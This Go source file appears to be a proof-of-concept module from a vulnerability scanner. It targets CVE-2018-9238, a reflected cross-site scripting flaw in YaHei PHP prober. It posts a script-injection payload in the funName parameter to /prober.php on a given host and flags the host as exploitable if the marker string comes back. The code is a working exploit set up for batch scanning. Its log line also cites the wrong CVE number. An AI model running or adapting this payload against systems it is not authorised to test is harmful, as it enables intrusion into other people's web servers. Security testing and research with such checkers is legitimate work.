package poc

import (
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"

	"../logger"
)

// YaHeiPHPXSS is yahei php prober v0.4.7 xss,
// CVE-2018-9238.
type YaHeiPHPXSS struct {
	target      string
	payload     url.Values
	Exploitable bool
}

// NewYaHeiPHPXSS returns a new YaHeiPHP XSS checker.
func NewYaHeiPHPXSS() *YaHeiPHPXSS {
	return &YaHeiPHPXSS{
		payload: url.Values{
			"pInt":     {"No+Test"},
			"pFloat":   {"No+Test"},
			"pIo":      {"No+Test"},
			"host":     {"localhost"},
			"port":     {"3306"},
			"login":    {},
			"password": {},
			"funName":  {`')</script><script>alert("AssassinGooo");</script>`},
			"act":      {"Function+Test"},
			"mailAdd":  {},
		},
	}
}

// Info implements PoC interface.
func (y *YaHeiPHPXSS) Info() string {
	return "CVE-2018-9238"
}

// Set implements PoC interface.
// Params should be {target string}
func (y *YaHeiPHPXSS) Set(v ...interface{}) {
	y.target = v[0].(string)
}

// Report implements PoC interface.
// For batch scan.
func (y *YaHeiPHPXSS) Report() map[string]interface{} {
	return map[string]interface{}{
		"host":        y.target,
		"exploitable": y.Exploitable,
	}
}

// Run implements PoC interface.
func (y *YaHeiPHPXSS) Run() {
	logger.Green.Println("Checking YaHeiPHPXSS (CVE-2018-7600)...")
	y.check()
	logger.Blue.Println(y.target, y.Exploitable)
}

func (y *YaHeiPHPXSS) check() {
	client := &http.Client{
		Timeout: 5 * time.Second,
	}
	req, err := http.NewRequest("POST",
		"http://"+y.target+"/prober.php",
		strings.NewReader(y.payload.Encode()))
	if err != nil {
		logger.Red.Println(err)
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0")
	resp, err := client.Do(req)
	if err != nil {
		logger.Red.Println(err)
		return
	}
	body, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()

	if strings.Contains(string(body), "AssassinGooo") {
		y.Exploitable = true
	}
}
